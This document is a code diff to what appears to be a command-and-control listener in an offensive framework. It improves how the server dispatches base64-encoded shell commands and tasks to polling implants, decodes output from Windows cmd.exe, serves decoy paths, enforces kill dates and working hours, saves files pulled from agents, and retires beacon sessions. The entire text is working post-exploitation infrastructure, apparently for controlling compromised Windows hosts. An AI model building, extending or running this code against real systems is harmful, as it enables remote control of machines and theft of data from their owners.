@@ -16,6 +16,22 @@ from lib.c2.beacon_timing import pad_response
 from lib.c2.ops_log import get_ops_log
 
 
+def _decode_agent_bytes(raw: bytes) -> str:
+    """Decode implant stdout. Windows cmd.exe is often OEM (CP850), not UTF-8."""
+    if not raw:
+        return ""
+    try:
+        return raw.decode("utf-8")
+    except UnicodeDecodeError:
+        pass
+    for enc in ("cp850", "cp437", "cp1252", "latin-1"):
+        try:
+            return raw.decode(enc)
+        except UnicodeDecodeError:
+            continue
+    return raw.decode("utf-8", errors="replace")
+
+
 class Module(Listener):
     __info__ = {
         "name": "Reverse HTTP Polling Listener",
@@ -82,6 +98,7 @@ class Module(Listener):
         self._killed_sessions = set()
         self._in_flight_tasks = {}  # session_id -> [task_id, ...] awaiting /result
         self._decoy_paths = ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status", "/login"]
+        self._denied_implants = set()  # implant ids retired via kill_agent / sessions kill
 
     def _ops(self):
         return get_ops_log(self.framework)
@@ -345,6 +362,11 @@ class Module(Listener):
         if pub and not self._verify_client(client_id, sig):
             return None
 
+        # Retired implants: allow one mapped poll for die=true, never create a new durable session
+        denied = getattr(self, "_denied_implants", None) or set()
+        if client_id in denied and client_id not in self._client_id_to_session:
+            return None
+
         if client_id in self._client_id_to_session:
             sid = self._client_id_to_session[client_id]
             self._last_seen[sid] = time.time()
@@ -448,8 +470,10 @@ class Module(Listener):
             }
         return {"task_id": "", "command": str(item or ""), "task": None, "encoding": "base64"}
 
-    def _build_poll_response(self, session_id: str) -> str:
-        """Assemble /poll JSON honouring kill date and working hours."""
+    def _build_poll_response(self, session_id: str) -> tuple:
+        """Assemble /poll JSON. Returns ``(body, has_task)`` — task is only
+        committed via ``_commit_poll_dispatch`` after a successful socket write.
+        """
         profile = self._profile_for(session_id)
 
         if profile.is_past_kill_date() or session_id in self._killed_sessions:
@@ -463,15 +487,23 @@ class Module(Listener):
                         pass
             self._pending_commands[session_id] = []
             payload = profile.to_poll_dict(die=True)
-            return self._encode_poll_body(payload)
+            # Drop maps after instructing implant to die
+            cid = self._session_to_client_id.pop(session_id, None)
+            if cid:
+                self._client_id_to_session.pop(cid, None)
+                if not hasattr(self, "_denied_implants"):
+                    self._denied_implants = set()
+                self._denied_implants.add(str(cid))
+            return self._encode_poll_body(payload), False
 
         if not profile.is_within_working_hours():
             payload = profile.to_poll_dict(outside_hours=True)
-            return self._encode_poll_body(payload)
+            return self._encode_poll_body(payload), False
 
         queue = self._pending_commands.get(session_id, [])
-        item = self._normalize_queue_item(queue.pop(0)) if queue else None
+        item = self._normalize_queue_item(queue[0]) if queue else None
         payload = profile.to_poll_dict(command="")
+        has_task = False
         if item:
             tid = item.get("task_id") or ""
             if item.get("encoding") == "task" and item.get("task"):
@@ -479,6 +511,7 @@ class Module(Listener):
                 payload["encoding"] = "task"
                 payload["task"] = task
                 payload["command"] = json.dumps(task, ensure_ascii=False)
+                has_task = True
             elif item.get("encoding") == "task" and item.get("command"):
                 payload["encoding"] = "task"
                 payload["command"] = item["command"]
@@ -486,18 +519,38 @@ class Module(Listener):
                     payload["task"] = json.loads(item["command"])
                 except Exception:
                     payload["task"] = {"command": "shell", "args": {"cmd": item["command"]}, "task_id": tid}
+                has_task = True
             else:
                 cmd = item.get("command") or ""
                 if cmd:
                     payload["command"] = base64.b64encode(cmd.encode()).decode()
                     payload["encoding"] = "base64"
-            if tid:
-                try:
-                    self._ops().mark_sent(tid)
-                except Exception:
-                    pass
-                self._in_flight_tasks.setdefault(session_id, []).append(tid)
-        return self._encode_poll_body(payload)
+                    has_task = True
+        return self._encode_poll_body(payload), has_task
+
+    def _commit_poll_dispatch(self, session_id: str) -> None:
+        """Pop + mark_sent after a poll response was fully written to the socket."""
+        queue = self._pending_commands.get(session_id, [])
+        if not queue:
+            return
+        item = self._normalize_queue_item(queue.pop(0))
+        tid = item.get("task_id") or ""
+        if tid:
+            try:
+                self._ops().mark_sent(tid)
+            except Exception:
+                pass
+            self._in_flight_tasks.setdefault(session_id, []).append(tid)
+            try:
+                cmd_name = ""
+                if isinstance(item.get("task"), dict):
+                    cmd_name = str(item["task"].get("command") or "")
+                print_info(
+                    f"Dispatched task {tid[:8]}… to session {session_id[:8]}…"
+                    + (f" ({cmd_name})" if cmd_name else "")
+                )
+            except Exception:
+                pass
 
     def _stale_watch_loop(self):
         timeout = int(self.stale_timeout or 0)
@@ -533,7 +586,7 @@ class Module(Listener):
             def _prefix(self) -> str:
                 return "/" + str(listener._opt_str("url_prefix", "/c2") or "/c2").strip("/")
 
-            def _send(self, status, body, ctype="text/plain"):
+            def _send(self, status, body, ctype="text/plain") -> bool:
                 data = body.encode("utf-8") if isinstance(body, str) else body
                 try:
                     self.send_response(status)
@@ -546,9 +599,10 @@ class Module(Listener):
                         self.wfile.flush()
                     except Exception:
                         pass
+                    return True
                 except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                     # Client gone mid-response (common with short-lived poll implants on Windows)
-                    return
+                    return False
 
             def handle_one_request(self):
                 try:
@@ -587,8 +641,9 @@ class Module(Listener):
                     if not sid:
                         self._send(403, "invalid implant signature")
                         return
-                    body = listener._build_poll_response(sid)
-                    self._send(200, body, "application/json")
+                    body, has_task = listener._build_poll_response(sid)
+                    if self._send(200, body, "application/json") and has_task:
+                        listener._commit_poll_dispatch(sid)
                 except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                     return
 
@@ -630,7 +685,7 @@ class Module(Listener):
                         output = data.get("output", "")
                         if data.get("encoding") == "base64":
                             try:
-                                output = base64.b64decode(output).decode("utf-8", errors="replace")
+                                output = _decode_agent_bytes(base64.b64decode(output))
                             except Exception:
                                 output = str(output)
                     except Exception:
@@ -645,6 +700,11 @@ class Module(Listener):
                     except Exception:
                         pass
                     listener._complete_inflight_task(sid, output)
+                    try:
+                        preview = (output or "").replace("\n", " ")[:80]
+                        print_success(f"Result from {cid}: {len(output or '')} bytes — {preview}")
+                    except Exception:
+                        pass
                     self._send(200, "ok")
                 except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                     return
@@ -765,7 +825,7 @@ class Module(Listener):
         try:
             logged = self._ops().log_queued(
                 session_id=str(session_id),
-                command=f"{task_obj.command} {json.dumps(task_obj.args)[:200]}",
+                command=f"{task_obj.command} {json.dumps(task_obj.args, ensure_ascii=False)}".strip(),
                 implant_id=str(implant_id),
                 operator=str(operator or "console"),
                 listener_type="reverse_http_polling",
@@ -803,6 +863,49 @@ class Module(Listener):
             dest.write_bytes(blob)
             print_success(f"Agent file saved: {dest} ({len(blob)} bytes)")
 
+    def retire_beacon_session(self, session_id: str, *, remove: bool = True) -> None:
+        """Stop accepting work for a beacon and drop it from durable restore.
+
+        Keeps implant→session maps briefly so one last poll can receive ``die=true``.
+        Pending C2 tasks are marked killed so they are not restored on restart.
+        """
+        sid = str(session_id or "")
+        if not sid:
+            return
+        self._killed_sessions.add(sid)
+        for item in list(self._pending_commands.get(sid) or []):
+            tid = self._normalize_queue_item(item).get("task_id")
+            if tid:
+                try:
+                    self._ops().mark_killed(tid)
+                except Exception:
+                    pass
+        self._pending_commands[sid] = []
+        self._in_flight_tasks[sid] = []
+        try:
+            self._ops().kill_pending_for_session(sid)
+        except Exception:
+            pass
+        self._session_profiles.pop(sid, None)
+        self._received_output.pop(sid, None)
+        self._stale_alerted.discard(sid)
+        # Remember implant id so a late poll cannot recreate a durable session
+        cid = self._session_to_client_id.get(sid)
+        if cid:
+            if not hasattr(self, "_denied_implants"):
+                self._denied_implants = set()
+            self._denied_implants.add(str(cid))
+        if remove and self.framework and hasattr(self.framework, "session_manager"):
+            try:
+                self.framework.session_manager.remove_session(sid)
+            except Exception:
+                pass
+        if remove and self.framework and hasattr(self.framework, "shell_manager"):
+            try:
+                self.framework.shell_manager.remove_shell(sid)
+            except Exception:
+                pass
+
     def _complete_inflight_task(self, session_id, output: str):
         inflight = self._in_flight_tasks.get(session_id) or []
         if not inflight:
@@ -812,6 +915,10 @@ class Module(Listener):
             self._ops().mark_completed(task_id, output=str(output or ""))
         except Exception:
             pass
+        # Exit / bye from implant → drop durable session
+        text = str(output or "").strip().lower()
+        if text in ("bye", "bye!", "exiting", "exit"):
+            self.retire_beacon_session(session_id, remove=True)
 
     def _append_output(self, session_id, text):
         self._received_output.setdefault(session_id, []).append(text)
